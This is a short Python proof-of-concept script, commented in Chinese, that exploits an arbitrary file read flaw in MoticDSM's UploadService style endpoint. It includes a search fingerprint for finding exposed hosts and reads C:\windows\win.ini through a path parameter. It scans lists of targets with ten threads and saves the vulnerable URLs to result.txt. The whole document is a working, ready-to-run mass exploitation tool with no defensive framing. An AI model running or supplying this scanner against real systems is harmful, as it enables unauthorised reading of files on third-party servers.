#MoticDSM style 任意文件读取漏洞
#body="API/File/GetNoUploadedFiles"

import requests,sys,argparse
requests.packages.urllib3.disable_warnings()
from multiprocessing.dummy import Pool
def main():
   
    parse = argparse.ArgumentParser(description="MoticDSM style 任意文件读取漏洞")
    parse.add_argument('-u','--url',dest='url',type=str,help='Please input url')
    parse.add_argument('-f','--file',dest='file',type=str,help='Please input file')
    args = parse.parse_args()
   
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip())
            mp = Pool(10)
            mp.map(poc, url_list)
            mp.close()
            mp.join()
    else:
        pass


def poc(target):
    
    payload = '/UploadService/Page/style?f=C:\\windows\win.ini'



    headers = {
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0',
        'Accept':'application/json, text/javascript, */*; q=0.01',
        'Accept-Language':'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding':'gzip, deflate',
        'Connection':'close',
    }
        
    try:
        # print(22222)
        res1 = requests.get(url=target+payload,headers=headers,timeout=10,verify=False)
        # print(1111)
        # print(res1.text)
        if 'MAP' in res1.text:
            print(target+'信息泄露')
            with open('result.txt','a',encoding='utf-8') as f:
                f.write(target+'\n')
    except Exception as e:
        pass

if __name__ == '__main__':
    main() # 主函数